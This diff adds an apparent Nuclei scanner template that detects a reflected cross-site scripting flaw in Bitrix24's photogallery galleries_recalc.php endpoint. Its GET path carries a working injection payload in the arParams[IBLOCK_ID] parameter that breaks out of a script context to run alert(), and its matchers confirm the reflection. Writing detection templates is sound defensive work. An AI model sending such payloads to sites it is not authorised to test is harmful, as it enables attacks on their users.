@@ -1,0 +1,28 @@
+id: CVE-2023-004
+
+info:
+  name: Bitrix24 <=20.0.0 - XSS on endpoint galleries_recalc.php
+  author: crlf,metascan
+  severity: medium
+  description: The Web Application Firewall in Bitrix24 up to and including 20.0.0 allows XSS via the arParams[IBLOCK_ID] parameter to the /components/bitrix/photogallery_user/templates/.default/galleries_recalc.php URI.
+  reference:
+    - https://github.com/cr1f/writeups/blob/main/attacking_bitrix.pdf
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
+    cvss-score: 4.3
+    cve-id: CVE-2023-004
+    cwe-id: CWE-79
+  tags: cve,cve2023,xss,bitrix
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};alert("METASCAN");if(1){//'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "alert(\"METASCAN\");if(1){")'
+          - 'contains(body, "PhotoGalleryRecalcStart")'
+        condition: and
